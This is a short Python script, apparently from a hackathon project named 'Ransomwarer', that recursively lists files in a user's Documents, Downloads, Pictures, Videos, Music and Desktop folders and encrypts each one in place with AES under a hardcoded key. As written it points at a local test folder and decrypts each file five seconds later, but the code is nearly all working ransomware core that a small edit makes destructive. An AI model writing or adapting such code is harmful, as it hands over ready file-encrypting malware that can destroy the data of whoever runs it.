import os
import glob
import time
from Crypto.Cipher import AES

# For generating cipher text
secret_key = b"HotzFellas000000"
iv = b"HotzFellas000000"


def encrypt(file):
    # Encrypt the file

    # Read file
    with open(file, 'rb') as f:
        plaintext = f.read()

    # Encrypt the file
    cipher = AES.new(secret_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    # Save the file
    with open(file, "wb") as f:
        file_out = open(file, "wb")
        [file_out.write(x) for x in (cipher.nonce, tag, ciphertext)]


def decrypt_file(file):
    # Decrypt the file

    # Read file
    with open(file, "rb") as f:
        nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]

    # Decrypt the file
    cipher = AES.new(secret_key, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # Save the file
    with open(file, "wb") as f:
        f.write(data)


# Recursively list files in home directory
def list_files(path):
    files_list = []

    for file in glob.glob(path + "**", recursive=True):
        # Check if is a file
        if os.path.isfile(file):
            files_list.append(file)

    return files_list


# Get home directory
home_path = os.path.expanduser('~')
home_path = "/home/luke/Downloads/HackathonSpring2022/Ransomwarer/test/"

directories_to_encrypt = ["Documents/", "Downloads/",
                          "Pictures/", "Videos/", "Music/", "Desktop/"]

for directory in directories_to_encrypt:
    # Get list of file in home directory
    files = list_files(home_path + directory)
    print(files)

    for f in files:
        encrypt(f)
        time.sleep(5)
        decrypt_file(f)
